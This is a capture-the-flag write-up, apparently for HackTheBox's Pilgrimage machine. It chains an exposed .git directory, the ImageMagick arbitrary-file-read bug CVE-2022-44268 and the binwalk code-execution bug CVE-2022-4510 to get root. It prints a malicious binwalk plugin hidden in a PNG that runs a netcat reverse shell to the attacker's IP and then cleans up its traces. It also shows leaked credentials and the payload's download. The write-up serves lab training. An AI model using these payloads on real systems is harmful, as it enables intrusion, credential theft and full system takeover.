---
layout: post
title: Pilgrimage - Easy - Linux
date: 24-06-2023
categories: [CTF - HackTheBox]
tag: [git, Imagek, File Disclosure, binwalk]
---

## Nmap results

Directory enumeration revealed a hidden git directory which was readable. The git directory contained a imagek binary which is used for image conversions. It also contained the php code for the application along with the location of the database. Imagek was vulnerable and could be used to read files on the system by sending a poisoned image to the web application. The returned image would contain the file as hex within its contents. Using this ability to read files it was possible to extract the sqlite database and dump user credentials. Escalating to root involved taking advantage of an outdated version of binwalk which was running as root.

```
# Nmap 7.93 scan initiated Sat Jun 24 21:05:59 2023 as: nmap -sC -sV -p- -oA nmap/pilgrimage-allports -v 10.129.167.12
Nmap scan report for 10.129.167.12
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 24 21:06:31 2023 -- 1 IP address (1 host up) scanned in 32.49 seconds
```
## Gobuster directory search
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pilgrimage.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/06/25 02:13:01 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 153]
/tmp                  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]
/.htm                 (Status: 403) [Size: 153]                                 
/assets               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/assets/]
/.                    (Status: 200) [Size: 7621]                                   
/.htaccess            (Status: 403) [Size: 153]                                    
/vendor               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/vendor/]
/.htc                 (Status: 403) [Size: 153]                                    
/.html_var_DE         (Status: 403) [Size: 153]                                    
/.htpasswd            (Status: 403) [Size: 153]                                    
/.git                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/] 
```
## Dumping .git directory
`git-dumper http://pilgrimage.htb/.git/ .`

```
┌─[htb@parrot]─[~/hackthebox/pilgrimage/dump]
└──╼ $ ls -la
total 26952
drwxr-xr-x 1 htb htb      150 Jun 24 23:01 .
drwxr-xr-x 1 htb htb      138 Jun 25 01:59 ..
drwxr-xr-x 1 htb htb       68 Jun 24 23:01 assets
-rwxr-xr-x 1 htb htb     5538 Jun 24 23:01 dashboard.php
drwxr-xr-x 1 htb htb      128 Jun 24 23:01 .git
-rwxr-xr-x 1 htb htb     9250 Jun 24 23:01 index.php
-rwxr-xr-x 1 htb htb     6822 Jun 24 23:01 login.php
-rwxr-xr-x 1 htb htb       98 Jun 24 23:01 logout.php
-rwxr-xr-x 1 htb htb 27555008 Jun 24 23:01 magick
-rwxr-xr-x 1 htb htb     6836 Jun 24 23:01 register.php
drwxr-xr-x 1 htb htb       30 Jun 24 23:01 vendor
```
## Inspecting register.php
`$db = new PDO('sqlite:/var/db/pilgrimage'); `
## Inspecting magick
```
┌─[htb@parrot]─[~/hackthebox/pilgrimage/dump]
└──╼ $ file magick 
magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
```
```
┌─[htb@parrot]─[~/hackthebox/pilgrimage/dump]
└──╼ $ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

## CVE-2022-44268 ImageMagick Arbitrary File Read
Source: https://github.com/voidz0r/CVE-2022-44268
`cargo run "/var/db/pilgrimage"`

After generating the payload I uploaded it to the web app to be converted. Saved the returned image.

`identify -verbose output.png`

Converted the HEX into a readable format and cleaned it up

```
e8|StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf+tableuser-emilyabigchonkyboi???rs (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL))=indexsqlite_autoindex_users_1users
        emily
```

User credentials for emily

`emily:abigchonkyboi???`

## SSH as emily 

```
emily@pilgrimage:~$ ls -la
total 3892
drwxr-xr-x 5 emily emily    4096 Jun 25 10:32 .
drwxr-xr-x 3 root  root     4096 Jun  8 00:10 ..
lrwxrwxrwx 1 emily emily       9 Feb 10 13:42 .bash_history -> /dev/null
-rw-r--r-- 1 emily emily     220 Feb 10 13:41 .bash_logout
-rw-r--r-- 1 emily emily    3526 Feb 10 13:41 .bashrc
drwxr-xr-x 3 emily emily    4096 Jun  8 00:10 .config
-rw-r--r-- 1 emily emily      44 Jun  1 19:15 .gitconfig
drwx------ 3 emily emily    4096 Jun 25 07:37 .gnupg
drwxr-xr-x 3 emily emily    4096 Jun  8 00:10 .local
-rw-r--r-- 1 emily emily     807 Feb 10 13:41 .profile
-rwxr-xr-x 1 emily emily  836054 Jun 25 08:36 linpeas.sh
-rwxr-xr-x 1 emily emily 3104768 Jun 25 08:24 pspy64
-rw-r----- 1 root  emily      33 Jun 25 05:05 user.txt
```

## Inspecting malwarescan.sh
```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```
## Inspecting binwalk binary
```
emily@pilgrimage:~$ binwalk                                                                                                                                              
                                                                                                                                                                         
Binwalk v2.3.2                                                                                                                                                           
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```
## Binwalk v2.3.2 - Remote Command Execution (RCE) CVE-2022-4510
Source: https://www.exploit-db.com/exploits/51249

### Generating the payload
```
┌─[✗]─[htb@parrot]─[~/hackthebox/pilgrimage]
└──╼ $ python3 exploit.py ~/Pictures/small.png 10.10.14.76 9005

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```
### View of payload
```
┌─[htb@parrot]─[~/hackthebox/pilgrimage]
└──╼ $ cat payload.png 
PNG

IHDR

IZpc~8)HK profile(}=H@_S"3P;Yq*BZu0&
-b<8{wר(5hm     ![BA<F˘|=l,s~5o)@@ U
eT`#NN4'|C_$L2r,;X`djSQU)z2bUjJἾtHbK!@F
Z       /)_ͺ|;>Wz_m3.ۚ\'C2%W

)
 }k^o}>*u"eϴrp  pHYs.#.#x?vtIME
                               tEXtCommentCreated with GIMPWIDATc?nĀTi9IENDB`PFS/0.9../../../.config/binwalk/plugins/binwalk.py4.import binwalk.core.plugin
import os
import shutil
class MaliciousExtractor(binwalk.core.plugin.Plugin):
    def init(self):
        if not os.path.exists("/tmp/.binwalk"):
            os.system("nc 10.10.14.76 9005 -e /bin/bash 2>/dev/null &")
            with open("/tmp/.binwalk", "w") as f:
                f.write("1")
        else:
            os.remove("/tmp/.binwalk")
            os.remove(os.path.abspath(__file__))
            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))
```
### Copy payload onto box
```
emily@pilgrimage:~$ wget 10.10.14.76:8000/payload.png
--2023-06-25 10:47:16--  http://10.10.14.76:8000/payload.png
Connecting to 10.10.14.76:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1236 (1.2K) [image/png]
Saving to: 'payload.png'

payload.png                                100%[=====================================================================================>]   1.21K  --.-KB/s    in 0s      

2023-06-25 10:47:16 (257 MB/s) - 'payload.png' saved [1236/1236]
```
### Copy payload into shrunk directory for web app to execute
`emily@pilgrimage:~$ cp payload.png /var/www/pilgrimage.htb/shrunk/`
### Shell returned as root
```
root@pilgrimage:~# cat /root/root.txt
cat /root/root.txt
b5ece243618a3acf7f46fc4746f50e2d
root@pilgrimage:~# 
```
